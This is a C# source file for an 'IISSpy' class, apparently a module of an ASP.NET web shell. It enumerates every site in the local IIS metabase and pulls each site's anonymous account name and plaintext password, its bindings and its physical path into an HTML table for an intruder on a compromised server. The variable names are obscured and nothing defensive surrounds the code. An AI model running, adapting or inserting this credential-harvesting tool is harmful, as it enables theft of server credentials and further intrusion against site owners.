using System;
using System.Collections.Generic;
using System.Text;
using System.DirectoryServices;
using System.Web.UI.WebControls;
namespace MyModel
{
    public class IISSpy
    {

        public string GetSite()
        {
            Table t = new Table();
            t = GetAllSite();
            string iistext = "<table calss=\"alt1\">";
            iistext += "<tr><td>ID</td>";
            iistext += "<td>User</td>";
            iistext += "<td>Paass</td>";
            iistext += "<td>Site</td>";
            iistext += "<td>Path</td>";
            iistext += "</tr>";
            for (int i = 0; i < t.Rows.Count; i++)
            {
                iistext += "<tr calss=\"bg\">";
                TableRow tr = new TableRow();
                tr = t.Rows[i];
                for (int ii = 0; ii < tr.Cells.Count; ii++)
                {
                    iistext += "<td>";
                    TableCell tc = new TableCell();
                    tc = tr.Cells[ii];
                    iistext += tc.Text.ToString();
                    iistext += "</td>";
                }
                iistext += "</tr>";
            }
            iistext += "</table>";
            return iistext;
        }

        public Table GetAllSite()
        {
            tools tools = new tools();
            string qcKu = string.Empty;
            string mWGEm = "IIS://localhost/W3SVC";
            Table aaaa = new Table();
            //GlI.Style.Add("word-break", "break-all");
            try
            {
                DirectoryEntry HHzcY = new DirectoryEntry(mWGEm);
                int fmW = 0;
                
                foreach (DirectoryEntry child in HHzcY.Children)
                {
                    if (tools.SGde(child.Name.ToString()))
                    {
                        fmW++;
                        DirectoryEntry newdir = new DirectoryEntry(mWGEm + "/" + child.Name.ToString());
                        DirectoryEntry HlyU = newdir.Children.Find("root", "IIsWebVirtualDir");
                        //string bg = OKM();
                        string bg = "alt1";
                        TableRow TR = new TableRow();
                        //TR.Attributes["onmouseover"] = "this.className='focus';";
                        //TR.CssClass = bg;
                        //TR.Attributes["onmouseout"] = "this.className='" + bg + "';";
                        //TR.Attributes["title"] = "Site:" + child.Properties["ServerComment"].Value.ToString();
                        for (int i = 1; i < 6; i++)
                        {
                            try
                            {
                                TableCell tfit = new TableCell();
                                switch (i)
                                {
                                    case 1:
                                        tfit.Text = fmW.ToString();
                                        break;
                                    case 2:
                                        tfit.Text = HlyU.Properties["AnonymousUserName"].Value.ToString();
                                        break;
                                    case 3:
                                        tfit.Text = HlyU.Properties["AnonymousUserPass"].Value.ToString();
                                        break;
                                    case 4:
                                        StringBuilder sb = new StringBuilder();
                                        PropertyValueCollection pc = child.Properties["ServerBindings"];
                                        for (int j = 0; j < pc.Count; j++)
                                        {
                                            sb.Append(pc[j].ToString() + "<br>");
                                        }
                                        tfit.Text = sb.ToString().Substring(0, sb.ToString().Length - 4);
                                        break;
                                    case 5:
                                        tfit.Text = "<a href=\"javascript:IISspyClick('" + tools.MVVJ(HlyU.Properties["Path"].Value.ToString()) + "')\">" + HlyU.Properties["Path"].Value.ToString() + "</a>";
                                        break;
                                }
                                TR.Cells.Add(tfit);
                            }
                            catch (Exception ex)
                            {
                                continue;
                            }
                        }
                        aaaa.Rows.Add(TR);
                        //GlI.Controls.Add(TR);
                    }
                    
                }
            }
            catch (Exception ex)
            {
               
            }
            return aaaa;
        }
    }
}
